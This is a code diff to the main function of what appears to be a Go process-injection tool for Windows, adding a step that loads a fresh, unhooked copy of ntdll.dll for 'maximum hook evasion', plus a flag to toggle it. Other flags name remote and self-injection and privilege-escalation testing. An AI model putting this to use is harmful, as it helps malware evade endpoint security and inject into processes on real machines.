@@ -314,9 +314,16 @@ func isProcessRunning(pid uint32) error {
 
 func main() {
 
-	// Prewarm the syscall cache :3
-	if cacheErr := winapi.PrewarmSyscallCache(); cacheErr != nil {
-		debug.Printfln("MAIN", "Warning: Failed to prewarm cache: %v\n", cacheErr)
+	// Prewarm the fresh ntdll copy first for maximum hook evasion
+	debug.Printfln("MAIN", "Loading fresh, unhooked copy of ntdll.dll...\n")
+	if freshErr := winapi.PrewarmFreshNtdll(); freshErr != nil {
+		debug.Printfln("MAIN", "Warning: Failed to load fresh ntdll: %v\n", freshErr)
+		// Fallback to legacy prewarm if fresh method fails
+		if cacheErr := winapi.PrewarmSyscallCache(); cacheErr != nil {
+			debug.Printfln("MAIN", "Warning: Failed to prewarm cache: %v\n", cacheErr)
+		}
+	} else {
+		debug.Printfln("MAIN", "Successfully loaded fresh ntdll.dll copy\n")
 	}
 
 	
@@ -332,6 +339,7 @@ func main() {
 	selfFlag := flag.Bool("self", false, "Use self-injection instead of remote process injection")
 	debugFlag := flag.Bool("debug", false, "Enable debug logging for all operations")
 	privescFlag := flag.Bool("privesc", false, "Scan for privilege escalation vectors and test exploitation (no files created)")
+	ntdllFlag := flag.Bool("fresh", true, "Use fresh ntdll.dll copy (default: true)")
 
 	flag.Parse()
 
@@ -339,6 +347,13 @@ func main() {
 	if *debugFlag {
 		debug.SetDebugMode(true)
 		debug.Printfln("MAIN", "Debug mode enabled\n")
+	}
+	
+	// Show ntdll mode
+	if *ntdllFlag {
+		debug.Printfln("MAIN", "Using FRESH ntdll.dll copy for syscall resolution\n")
+	} else {
+		debug.Printfln("MAIN", "Using LEGACY ntdll.dll access method\n")
 	}
 
 	// Check if privesc flag is used
